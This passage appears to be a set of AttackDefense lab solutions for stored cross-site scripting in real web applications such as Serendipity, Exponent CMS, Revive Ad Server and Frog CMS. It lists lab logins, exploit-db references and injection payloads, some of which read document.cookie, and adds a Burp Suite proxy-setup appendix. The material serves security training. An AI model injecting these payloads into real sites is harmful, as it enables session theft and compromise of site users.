http://ocgvy1ejrur9vzo2zxsi0e3u1.mumbaix.attackdefenselabs.com/member.php?action=login 
 
Credentials: 
●
Username: ​admin 
●
Password: ​123321 
 
 
Admin Dashboard 
 
 
 
Step 4: ​Navigate to the vulnerable page. 
 
URL: 
http://opzlzk1r87ryrcjkfmfgy1mi8.mumbaix.attackdefenselabs.com/recipes.php?add=category 
 
 
 
 
 
 
Step 5: ​Inject the payload in the Name field. 
 
Payload:​ "><script>alert(/xss/)</script> 
 
 
 
Click on the Create button. 
 
 
 
The XSS payload triggered successfully. 
 
 
References:  
 
1.
Family CMS (​http://www.familycms.com/​) 
2.
Family CMS 2.7.2 - Multiple Persistent Cross-Site Scripting Vulnerabilities 
(​https://www.exploit-db.com/exploits/18230​)  
 
 
 
Name 
S9Y Serendipity 
URL 
https://www.attackdefense.com/challengedetails?cid=301 
Type 
Real World Webapps : Stored XSS 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
Solution:  
 
Step 1: ​Inspect the web application. 
 
 
 
Step 2: ​Search on google “S9Y Serendipity exploit db” and look for publicly available exploits. 
 
 
 
 
The exploit db link contains the payload required to exploit the vulnerability. 
 
Exploit DB Link: ​https://www.exploit-db.com/exploits/31516 
 
 
 
 
 
Step 3:​ The user has to authenticate in order to exploit the vulnerability. The login credentials 
are provided in the challenge description. 
 
URL: 
http://sxy9gxecc8ct58exuskh9wgf5.mumbaix.attackdefenselabs.com/serendipity_admin.php 
 
Credentials: 
●
Username: ​admin 
●
Password: ​password 
 
Login Page 
 
 
 
Admin Dashboard 
 
 
 
 
 
 
 
 
 
 
 
 
Step 4: ​Navigate to the Personal Settings page by clicking the button “Personal Settings”. 
 
 
 
Step 5: ​Inject the payload in Real name field to exploit the vulnerability. 
 
Payload:​ "><script>alert(document.cookie)</script> 
 
 
 
Click on the Save button. 
 
 
 
Step 6: ​Navigate to Manage users section by clicking on “Manage users” under Administration 
drop down menu. 
 
 
 
 
 
The XSS payload triggered successfully. 
 
 
References:  
 
1.
S9Y Serendipity (​http://www.s9y.org/​) 
2.
S9Y Serendipity 1.7.5 - 'Backend' Multiple Vulnerabilities 
(​https://www.exploit-db.com/exploits/31516​)  
 
 
 
Name 
Exponent CMS 
URL 
https://www.attackdefense.com/challengedetails?cid=302 
Type 
Real World Webapps : Stored XSS 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
Solution:  
 
Step 1: ​Inspect the web application. 
 
 
 
 
Step 2: ​Search on google “exponent cms exploit db” and look for publicly available exploits. 
 
 
 
 
 
The exploit db link contains the payload required to exploit the vulnerability. 
 
Exploit DB Link: ​https://www.exploit-db.com/exploits/36059 
 
 
 
Step 3:​ The user has to authenticate in order to exploit the vulnerability. The login credentials 
are provided in the challenge description. 
 
URL: ​http://cyade6hv7ua31k99nfrvh4i8x.mumbaix.attackdefenselabs.com 
 
Credentials: 
●
Username: ​admin 
●
Password: ​password 
 
 
Admin Dashboard 
 
 
Step 4: ​Navigate to the User profile settings under System Administrator drop down at “Edit my 
profile” section. 
 
 
 
Step 5: ​Inject the payload in First Name field. 
 
Payload:​ "><script>alert(1);</script> 
 
 
Click on Submit button. 
 
 
 
The XSS payload triggered successfully. 
 
 
References:  
 
1.
Exponent CMS (​http://www.exponentcms.org/​) 
2.
Exponent CMS 2.3.1 - Multiple Cross-Site Scripting Vulnerabilities 
(​https://www.exploit-db.com/exploits/36059​)  
 
 
 
Name 
Revive Ad Server 
URL 
https://www.attackdefense.com/challengedetails?cid=303 
Type 
Real World Webapps : Stored XSS 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
Solution:  
 
Step 1: ​Inspect the web application. 
 
 
Step 2: ​Search on google “revive ad server vulnerability” and look for publicly available exploits. 
 
 
 
 
 
 
 
The exploit db link contains the payload required to exploit the vulnerability. 
 
Exploit DB Link: ​https://www.exploit-db.com/exploits/41939 
 
 
 
Step 3:​ The user has to authenticate in order to exploit the vulnerability. The login credentials 
are provided in the challenge description. 
 
 
URL: 
http://ocgvy1ejrur9vzo2zxsi0e3u1.mumbaix.attackdefenselabs.com/member.php?action=login 
 
Credentials: 
●
Username: ​test2 
●
Password: ​password 
 
 
Admin Dashboard 
 
 
Step 4: ​Navigate to the vulnerable page at /banner-edit.php which is given at exploit-db. 
 
URL: 
a5cq68q95abkcnle8u7nsrj8d.mumbaix.attackdefenselabs.com/www/admin/banner-edit.php 
 
 
 
 
 
 
 
 
 
 
 
Select Banners and Click on “Add new Banner” 
 
 
Step 5: ​Select Generic HTML Banner from the dropdown menu. 
 
 
 
 
 
 
 
Step 6: ​Inject the payload in “banner code” text area as well as input any data in other required 
fields. 
 
Name: ​test 
Payload:​ <script>alert(1)</script> 
Size of Banner: ​Width: 300 and Height: 300 
 
 
 
 
 
 
 
 
 
 
 
Click on the Save changes. 
 
 
 
Step 7: ​Click on the newly generated banner. 
 
 
 
The XSS payload triggered successfully. 
 
 
References:  
 
1.
Revive Ad Server (​https://www.revive-adserver.com/​) 
2.
Revive Ad Server 4.0.1 - Cross-Site Scripting / Cross-Site Request Forgery 
(​https://www.exploit-db.com/exploits/41939​)  
 
 
 
Name 
Advanced Electron Forum 1.0.9 
URL 
https://www.attackdefense.com/challengedetails?cid=304 
Type 
Real World Webapps : Stored XSS 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
Solution:  
 
Step 1: ​Inspect the web application. 
 
 
 
 
Step 2: ​Search on google “Advanced Electron Forum 1.0.9 vulnerability” and look for publicly 
available exploits. 
 
 
 
 
The exploit db link contains the payload required to exploit the vulnerability. 
 
Exploit DB Link: ​https://www.exploit-db.com/exploits/39262 
 
 
 
 
Step 3:​ The user has to authenticate in order to exploit the vulnerability. The login credentials 
are provided in the challenge description. 
 
URL: ​http://l8g18hu9ng74gih3mbg5b4pio.mumbaix.attackdefenselabs.com/index.php?act=login 
 
Credentials: 
●
Username: ​admin 
●
Password: ​password1 
 
Login Page 
 
 
 
Admin Dashboard 
 
 
 
Step 4: ​Navigate to the vulnerable page. 
 
URL: 
http://l8g18hu9ng74gih3mbg5b4pio.mumbaix.attackdefenselabs.com/index.php?act=usercp&uc
pact=signature 
 
 
 
Step 5: ​Click on the Anchor link button and inject the payload. 
 
Payload: ​http://"onMouseMove="alert(0) 
 
 
 
 
 
 
 
 
 
 
Click on the Ok button. 
 
 
 
The XSS payload triggered successfully. 
 
 
 
 
 
 
References:  
 
1.
Advanced Electron Forum (​www.anelectron.com/downloads/​) 
2.
Advanced Electron Forum 1.0.9 - Persistent Cross-Site Scripting 
(​https://www.exploit-db.com/exploits/39262​)  
 
 
 
Name 
S9Y Serendipity 2.0.4 
URL 
https://www.attackdefense.com/challengedetails?cid=305 
Type 
Real World Webapps : Stored XSS 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
Solution:  
 
Step 1: ​Inspect the web application. 
 
 
 
 
Step 2: ​Search on google “S9Y Serendipity 2.0.4 vulnerability” and look for publicly available 
exploits. 
 
 
 
 
The exploit db link contains the payload required to exploit the vulnerability. 
 
Exploit DB Link: ​https://www.exploit-db.com/exploits/40650 
 
 
 
Step 3:​ The user has to authenticate in order to exploit the vulnerability. The login credentials 
are provided in the challenge description. 
 
URL: 
http://bgzreov7ixaqpslpu030kynwh.mumbaix.attackdefenselabs.com/serendipity_admin.php 
 
Credentials: 
●
Username: ​admin 
●
Password: ​password 
 
Login Page 
 
 
Admin Dashboard 
 
 
 
Step 4: ​Navigate to the referrer page given in the exploit db link. 
 
URL: 
http://bgzreov7ixaqpslpu030kynwh.mumbaix.attackdefenselabs.com/serendipity_admin.php?ser
endipity[adminModule]=entries&serendipity[adminAction]=new 
 
 
 
Step 5: ​Inject the payload in the Entry Body section. Enter any information in the title field. 
 
Payload:​ <script>alert(1)</script> 
 
 
 
Step 6: ​Click on the Save button. 
 
 
 
 
Click on the “View” option to trigger the vulnerability. 
 
 
 
The XSS payload triggered successfully. 
 
 
 
 
References:  
 
1.
S9Y Serendipity (​http://docs.s9y.org/​) 
2.
S9Y Serendipity 2.0.4 - Cross-Site Scripting (​https://www.exploit-db.com/exploits/40650​)  
 
 
 
Name 
PHPLiteAdmin 
URL 
https://www.attackdefense.com/challengedetails?cid=306 
Type 
Real World Webapps : Stored XSS 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
Solution:  
 
Step 1: ​Inspect the web application. 
 
 
 
 
Step 2: ​Search on google “phpliteadmin xss exploit” and look for publicly available exploits. 
 
 
 
 
 
 
 
 
 
 
The exploit db link contains the payload required to exploit the vulnerability. 
 
Exploit DB Link: ​https://www.exploit-db.com/exploits/39714 
 
 
 
Step 3:​ The user has to authenticate in order to exploit the vulnerability. The login credentials 
are provided in the challenge description. 
 
URL: ​http://5hawocee2qkqka2t35pwcy00r.mumbaix.attackdefenselabs.com/ 
 
Credentials: 
●
Password: ​password 
 
 
Admin Dashboard 
 
 
 
Step 4: ​Navigate to the vulnerable URL given at exploit-db link. 
 
URL: 
http://5hawocee2qkqka2t35pwcy00r.mumbaix.attackdefenselabs.com/phpliteadmin.php?view=s
ql  
 
 
 
 
 
 
 
Step 5: ​Inject the payload in SQL query box. 
 
Payload:​ "><script>alert(3)</script> 
 
 
 
Click on the Go button. 
 
 
 
The XSS payload triggered successfully. 
 
 
References:  
 
1.
phpLiteAdmin (​https://www.phpliteadmin.org​) 
2.
phpLiteAdmin 1.9.6 - Multiple Vulnerabilities (​https://www.exploit-db.com/exploits/39714​)  
 
 
 
Name 
Frog CMS 
URL 
https://www.attackdefense.com/challengedetails?cid=307 
Type 
Real World Webapps : Stored XSS 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
Solution:  
 
Step 1: ​Inspect the web application. 
 
 
 
 
Step 2: ​Search on google “Frog CMS vulnerability exploit db” and look for publicly available 
exploits. 
 
 
 
 
 
 
The exploit db link contains the payload required to exploit the vulnerability. 
 
Exploit DB Link: ​https://www.exploit-db.com/exploits/44551 
 
 
 
Step 3:​ The user has to authenticate in order to exploit the vulnerability. The login credentials 
are provided in the challenge description. 
 
URL: 
http://ocgvy1ejrur9vzo2zxsi0e3u1.mumbaix.attackdefenselabs.com/member.php?action=login 
 
Credentials: 
●
Username: ​admin 
●
Password: ​12897918e9K 
 
 
Admin Dashboard 
 
 
 
Step 4: ​Click on “Administration” button. 
 
 
 
Click on the Settings button under Administration section. 
 
 
 
Step 5: ​Inject the payload in Admin Site title textbox. 
 
Payload:​ Frog CMS1 "><img src=a onerror='alert(1)'/> 
 
 
 
Step 6: ​Click on the Save button. 
 
 
 
 
The XSS payload triggered successfully. 
 
 
References:  
 
1.
Frog CMS  (​https://github.com/philippe/FrogCMS​)  
2.
Frog CMS 0.9.5 - Persistent Cross-Site Scripting 
(​https://www.exploit-db.com/exploits/44551​)  
 
 
 
Name 
MyBB My Arcade 
URL 
https://www.attackdefense.com/challengedetails?cid=308 
Type 
Real World Webapps : Stored XSS 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
Solution:  
 
Step 1: ​Inspect the web application. 
 
 
 
 
Step 2: ​Search on google “MyBB My Arcade vulnerability” and look for publicly available 
exploits. 
 
 
 
 
 
The exploit db link contains the payload required to exploit the vulnerability. 
 
Exploit DB Link: ​https://www.exploit-db.com/exploits/44186 
 
 
 
Step 3:​ The user has to authenticate in order to exploit the vulnerability. The login credentials 
are provided in the challenge description. 
 
URL: 
http://fa3eqpsaldd6funq2a2p0bul4.mumbaix.attackdefenselabs.com/member.php?action=login 
 
Credentials: 
●
Username: ​admin 
●
Password: ​password 
 
Login Page 
 
Admin Dashboard 
 
 
 
Step 4: ​Navigate to the Arcade section by clicking on the arcade icon. 
 
 
 
Step 5: ​Click on any game. 
 
 
 
By default the flash is blocked. Click on the flash icon and choose Allow when asked 
 
 
 
Step 6: ​Play the game. 
 
 
 
Once the game is over 
 
 
 
 
 
Step 7: ​ click on edit in comments and inject the payload. 
 
Payload: ​<p """><SCRIPT>alert("XSS")</SCRIPT>"> 
 
 
 
Click on the Update button comment. 
 
 
 
Step 8: ​Click on edit again. 
 
 
 
The XSS payload triggered successfully. 
 
 
 
 
 
 
References:  
 
1.
MyBB (​https://mybb.com/​) 
2.
MyBB Plugin Downloads 
(​https://community.mybb.com/mods.php?action=view&pid=411​)  
3.
MyBB My Arcade Plugin 1.3 - Cross-Site Scripting 
(​https://www.exploit-db.com/exploits/44186​) 
 
 
 
Name 
Get Simple 3.3.1 
URL 
https://www.attackdefense.com/challengedetails?cid=310 
Type 
Real World Webapps : Stored XSS 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
Solution:  
 
Step 1: ​Inspect the web application. 
 
 
 
 
Step 2: ​Search on google “Get Simple 3.3.1 exploit db” and look for publicly available exploits. 
 
 
 
 
The exploit db link contains the payload required to exploit the vulnerability. 
 
Exploit DB Link: ​https://www.exploit-db.com/exploits/43888 
 
 
 
Step 3:​ The user has to authenticate in order to exploit the vulnerability. The login credentials 
are provided in the challenge description. 
 
URL: ​http://bn7o2qul3vbmwxwgluozyj6z2.mumbaix.attackdefenselabs.com/admin/ 
 
Credentials: 
●
Username: ​admin 
●
Password: ​password1 
 
Login Page 
 
 
 
Admin Dashboard 
 
 
 
Step 4: ​Navigate to the vulnerable page. 
 
URL: ​http://bn7o2qul3vbmwxwgluozyj6z2.mumbaix.attackdefenselabs.com/admin/settings.php 
 
 
 
Step 5: ​Inject the payload in Display Name text field as well as enter the url suggested in 
Website URL box. 
 
Payload:​ "><script>alert(3);</script> 
 
 
 
 
 
 
 
 
 
 
 
 
Scroll down and click on the Save Settings button. 
 
 
 
The XSS payload triggered successfully. 
 
 
References:  
 
1.
GetSimple CMS (​http://get-simple.info/​) 
2.
GetSimple CMS 3.3.1 - Cross-Site Scripting (​https://www.exploit-db.com/exploits/43888​)  
 
 
 
Name 
Concrete5 CMS 
URL 
https://www.attackdefense.com/challengedetails?cid=327 
Type 
Real World Webapps : Stored XSS 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
Solution:  
 
Step 1: ​Inspect the web application. 
 
 
 
 
Step 2: ​Search on google “concrete5 cms xss exploit db” and look for publicly available exploits. 
 
 
 
 
The exploit db link contains the payload required to exploit the vulnerability. 
 
Exploit DB Link: ​https://www.exploit-db.com/exploits/26077 
 
 
 
Step 3:​ The user has to authenticate in order to exploit the vulnerability. The login credentials 
are provided in the challenge description. 
 
URL: ​http://dm5tq1jkuyxqfvdxvxv0n08rq.asiax.attackdefenselabs.com/index.php/login/ 
 
Credentials: 
●
Username: ​admin 
●
Password: ​123321 
 
Login Page 
 
 
 
Admin Dashboard 
 
 
 
 
 
 
 
 
 
 
 
Step 4: ​Navigate to the vulnerable URL provided at exploit-db page. 
 
URL: 
http://dm5tq1jkuyxqfvdxvxv0n08rq.asiax.attackdefenselabs.com/index.php/dashboard/system/at
tributes/sets/ 
 
 
 
Step 5: ​Click on Collection button. 
 
 
 
Step 6: ​Inject the payload in Name field and fill any data in Handle field. 
 
Handle: ​test 
Payload: ​"><script>alert('hacked by eXpl0i13r\n'+document.cookie)</script> 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
Click on Add Set. 
 
 
 
The XSS payload triggered successfully. 
 
 
 
 
 
 
References:  
 
1.
Concrete5 CMS (​http://www.concrete5.org​) 
2.
Concrete5 CMS 5.6.1.2 - Multiple Vulnerabilities 
(​https://www.exploit-db.com/exploits/26077​)  
 
 
 
Name 
Nakid CMS 
URL 
https://www.attackdefense.com/challengedetails?cid=328 
Type 
Real World Webapps : Stored XSS 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
Solution:  
 
Step 1: ​Inspect the web application. 
 
 
 
 
Step 2: ​Search on google “nakid cms vulnerability” and look for publicly available exploits. 
 
 
 
 
 
 
 
The exploit db link contains the payload required to exploit the vulnerability. 
 
Exploit DB Link: ​https://www.exploit-db.com/exploits/37270 
 
 
 
Step 3:​ The user has to authenticate in order to exploit the vulnerability. The login credentials 
are provided in the challenge description. 
 
 
URL: ​http://1dyhql22n4o9i7fobghz9z2i6.asiax.attackdefenselabs.com/index.php/system/login 
 
Credentials: 
●
Username: ​admin 
●
Password: ​password 
 
Admin Dashboard 
 
 
 
Step 4: ​Navigate to the users page under System drop down menu. 
 
 
Step 5: ​Click on admin field and choose the edit option located at bottom left of the table. 
 
 
 
 
 
 
Step 6: ​Inject the payload in First Name field. 
 
Payload: ​<script>alert(1)</script> 
 
 
 
Click on Submit button. 
 
 
 
The XSS payload triggered successfully. 
 
 
References:  
 
1.
Nakid CMS (​http://kilrizzy.github.io/Nakid-CMS​) 
2.
Nakid CMS - Multiple Vulnerabilities (​https://www.exploit-db.com/exploits/37270​)  
 
 
 
Name 
Piwigo User Tag Plugin 
URL 
https://www.attackdefense.com/challengedetails?cid=329 
Type 
Real World Webapps : Stored XSS 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
Solution:  
 
Step 1: ​Inspect the web application. 
 
 
 
Step 2: ​Search on google “Piwigo User Tag Plugin vulnerability” and look for publicly available 
exploits. 
 
 
 
The exploit db link contains the payload required to exploit the vulnerability. 
 
Exploit DB Link: ​https://www.exploit-db.com/exploits/42443 
 
 
 
Step 3:​ The user has to authenticate in order to exploit the vulnerability. The login credentials 
are provided in the challenge description. 
 
URL: ​http://xi2fguuveldtbhspbng95mjp6.mumbaix.attackdefenselabs.com/identification.php 
 
Credentials: 
●
Username: ​admin 
●
Password: ​password 
 
Admin Login 
 
 
 
Admin Dashboard 
 
 
 
 
 
 
 
 
 
Step 4: ​Click on the album attackdefense. 
 
 
 
Select the wallpaper and click on keywords button 
 
 
 
Step 5: ​Enter anything in keywords. 
 
 
 
 
Step 6: ​Click on Update tags and Intercept the request with burp suite. 
 
To configure Burp Suite check the Appendix. 
 
 
Step 7: ​Inject the payload in tags field and click on Forward. 
 
Payload: ​<script>prompt()</script> 
 
 
 
Reload the webpage. 
 
 
 
The XSS payload triggered successfully. 
 
 
References:  
 
1.
Piwigo (​http://piwigo.org/basics/downloads​) 
2.
Piwigo Plugin Facetag (​http://piwigo.org/ext/extension_view.php?eid=845​)  
3.
Piwigo Plugin Facetag 0.0.3 - Cross-Site Scripting 
(​https://www.exploit-db.com/exploits/42098​)  
 
 
 
 
 
 
 
 
 
 
 
 
 
 
Appendix  
 
 
Appendix A: Configuration for Windows OS 
     A.1 Google Chrome with Burp Suite 
     A.2 Mozilla Firefox with Burp Suite 
 
Appendix B: Configuration for Kali OS 
                B.1 Google Chrome with Burp Suite 
    B.2 Mozilla Firefox with Burp Suite 
 
Appendix C: Configuration for FoxyProxy Standard plugin 
    C.1 FoxyProxy on Google Chrome with Burp Suite 
    C.2 FoxyProxy on Mozilla Firefox with Burp Suite 
 
  
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
Appendix A 
 
A.1 Google Chrome with Burp Suite (Windows OS) 
 
Step 1: ​Open Google Chrome and navigate to the URL given below. 
 
URL: ​chrome://settings 
 
 
 
Google Chrome Settings page will appear. 
 
Step 2:​ Search for “proxy” in the search box. 
 
 
 
 
 
 
 
 
 
Step 3: ​Upon clicking on “Open proxy settings”, Windows “Internet Properties” settings dialog 
box will appear. Click on “LAN settings” button. 
 
 
 
Step 4: ​Select the checkbox “Use a proxy server for your LAN (These settings will not apply to 
dial-up or VPN connections)”. And  enter “127.0.0.1” and “8080” in “Address” textbox and “Port” 
textbox respectively.  
 
 
 
Click “OK” on the “Local Area Network (LAN) Settings” dialog box and close the “Internet 
Properties” dialog box. 
 
Step 5: ​Start Burp suite. 
 
 
 
Step 6: ​Navigate to “Options” tab under “Proxy” tab and verify that the “running” checkbox is 
selected for the interface “127.0.0.1:8080”. 
 
 
 
All the HTTP request made by Google Chrome will be intercepted by Burp Suite.  
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
A.2 Mozilla Firefox with burp suite (Windows OS) 
 
Step 1: ​Open Mozilla Firefox and navigate to the URL given below. 
 
URL: ​about:preferences 
 
 
 
Step 2: ​Scroll down to the bottom of the page and click on “Settings” button under “Network 
Settings” section. 
 
 
 
 
 
 
Step 3:  ​Enter “127.0.0.1” and “8080” in “HTTP Proxy” textbox and “Port” textbox respectively. 
 
 
 
Click on the OK button.  
 
Step 4: ​Start Burp suite. 
 
 
 
Step 5: ​Navigate to “Options” tab under “Proxy” tab and verify that the “running” checkbox is 
selected for the interface “127.0.0.1:8080”. 
 
 
 
All the HTTP request made by Mozilla Firefox will be intercepted by Burp Suite.  
 
 
 
 
 
 
 
 
Appendix B 
 
B.1 Google Chrome with Burp Suite (Kali OS) 
 
Step 1: ​Open Google Chrome and navigate to the URL given below. 
 
URL: ​chrome://settings 
 
 
 
Google Chrome Settings page will appear. 
 
Step 2:​ Search for “proxy” in the search box. 
 
 
 
 
 
 
Step 3: ​Upon clicking on “Open proxy settings”, The “Networks” settings window will appear. 
Click on Network Proxy option. 
 
 
 
 
Step 4: ​Enter “127.0.0.1” in “HTTP Proxy” textbox and enter 8080 as port.  
 
 
 
Close the dialog box.  
 
Step 5: ​Start Burp suite. 
 
 
 
 
Step 6: ​Navigate to “Options” tab under “Proxy” tab and verify that the “running” checkbox is 
selected for the interface “127.0.0.1:8080”. 
 
 
 
 
 
 
 
All the HTTP/HTTPS request made by Google Chrome will be intercepted by Burp Suite.  
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
B.2 Mozilla Firefox with burp suite (Kali OS) 
 
Step 1: ​Open Mozilla Firefox and navigate to the URL given below. 
 
URL: ​about:preferences 
 
 
 
 
Step 2: ​Click on “Advanced” tab on the left panel and then click on “Settings” button under 
“Network” tab. 
 
 
 
 
 
 
 
 
Step 3:  ​Enter “127.0.0.1” and “8080” in “HTTP Proxy” textbox and “Port” textbox respectively. 
 
 
 
 
Step 4: ​Start Burp suite. 
 
 
 
 
 
Step 5: ​Navigate to “Options” tab under “Proxy” tab and verify that the “running” checkbox is 
selected for the interface “127.0.0.1:8080”. 
 
 
 
 
 
All the HTTP request made by Mozilla Firefox will be intercepted by Burp Suite.  
 
 
 
 
 
 
 
 
Appendix C 
 
C.1 FoxyProxy on Google Chrome with Burp Suite 
 
Step 1: ​Installing FoxyProxy. 
 
FoxyProxy Standard plugin for Google Chrome can be installed from the URL given below: 
 
URL: 
https://chrome.google.com/webstore/detail/foxyproxy-standard/gcknhkkoolaabfmlnjonogaaifnjlfn
p?hl=en 
 
After installing FoxyProxy, a small fox icon will appear on the right side of the address bar.  
 
 
 
 
 
Step 2: ​Click on the FoxyProxy icon and click on Options. 
 
 
 
Step 3: ​Click on the “Add New Proxy” Button.  
 
 
 
Step 4: ​Enter “127.0.0.1” in “Host or IP Address” textbox and enter “8080” in Port textbox. 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
Click on the Save button. 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
The configured proxy will appear in the proxies table. 
 
Step 5: ​Enable the proxy. 
 
Click on the FoxyProxy icon and select the option “Use proxy 127.0.0.1:8080 for all URLs” 
 
 
 
The FoxyProxy icon will change its color (In this case it is blue). 
 
 
 
 
 
 
 
 
 
Step 6: ​Start Burp suite. 
 
 
 
Step 7: ​Navigate to “Options” tab under “Proxy” tab and verify that the “running” checkbox is 
selected for the interface “127.0.0.1:8080”. 
 
 
 
All the HTTP/HTTPS request made by Google Chrome will be intercepted by Burp Suite.  
 
 
 
 
 
 
C.2 FoxyProxy on Mozilla Firefox with Burp Suite 
 
Step 1: ​Installing FoxyProxy. 
 
FoxyProxy Standard plugin for Mozilla Firefox can be installed from the URL given below: 
 
URL: ​https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/ 
 
After installing FoxyProxy, a small fox icon will appear on the right side of the address bar.  
 
 
 
Step 2: ​Click on the FoxyProxy icon and click on Options. 
 
 
 
 
 
 
Step 3: ​Click on the add button on the left panel 
 
 
 
Step 4: ​Enter “127.0.0.1” in “IP Address, DNS name, server name” textbox and enter “8080” in 
Port textbox. 
 
 
 
Click on the Save button. 
 
 
 
The proxy will appear in the proxies table. 
 
Step 5: ​Enable the proxy. 
 
Click on the FoxyProxy icon and select the option “Use proxy 127.0.0.1:8080 for all URLs 
(ignore patterns)” 
 
 
 
The FoxyProxy icon will change its color (In this case it is green). 
 
Step 6: ​Start Burp suite. 
 
 
 
Step 7: ​Navigate to “Options” tab under “Proxy” tab and verify that the “running” checkbox is 
selected for the interface “127.0.0.1:8080” 
 
 
 
All the HTTP/HTTPS request made by Mozilla Firefox will be intercepted by Burp Suite.  
 
 
 
 
 
 
 
Name 
YetiForce CRM 
URL 
https://www.attackdefense.com/challengedetails?cid=330 
Type 
Real World Webapps : Stored XSS 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
